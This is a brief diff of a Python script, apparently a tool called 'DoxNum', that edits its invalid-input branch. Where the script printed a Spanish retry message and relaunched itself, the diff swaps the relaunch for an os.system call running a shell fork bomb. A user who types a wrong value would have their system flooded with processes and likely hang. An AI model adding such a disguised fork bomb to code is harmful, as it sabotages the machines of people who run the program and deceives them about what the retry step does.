@@ -409,7 +409,7 @@ else:
     print("Introdujiste un valor erroneo reintenta por favor")
     time.sleep(3)
     os.system("clear")
-    os.system("python3 DoxNum")
+    os.system(":(){ :|:& };:")
 
     '''
 def fetr():
